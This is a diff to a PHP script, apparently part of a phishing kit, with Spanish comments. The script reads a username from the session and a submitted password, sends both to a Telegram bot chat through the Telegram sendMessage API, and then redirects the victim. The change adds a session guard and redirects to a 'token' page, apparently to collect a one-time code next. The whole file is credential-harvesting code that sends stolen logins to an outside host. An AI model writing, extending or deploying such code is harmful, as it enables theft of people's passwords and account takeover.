@@ -4,7 +4,15 @@ session_start();
 require_once("settings.php");
 $website = "https://api.telegram.org/bot$token";
 
-if (isset($_SESSION["usuario"]) && isset($_POST["cpass"])) {
+// Verificar si el usuario está en sesión
+if (!isset($_SESSION["usuario"])) {
+    // Si no hay usuario en sesión, redirigir al inicio
+    header("Location: index.php");
+    exit;
+}
+
+// Procesar el formulario de contraseña
+if (isset($_POST["cpass"]) && !empty($_POST["cpass"])) {
     $usuario = $_SESSION["usuario"];
     $cpass = $_POST["cpass"];
 
@@ -21,8 +29,8 @@ if (isset($_SESSION["usuario"]) && isset($_POST["cpass"])) {
     $url = "$website/sendMessage?chat_id=$chat_id&parse_mode=HTML&text=" . urlencode($msg);
     file_get_contents($url);
 
-    // Redirección
-    header("Location: procesar_validacion.php");
+    // Redirección a la pantalla de token
+    header("Location: token.php");
     exit;
 }
 ?>
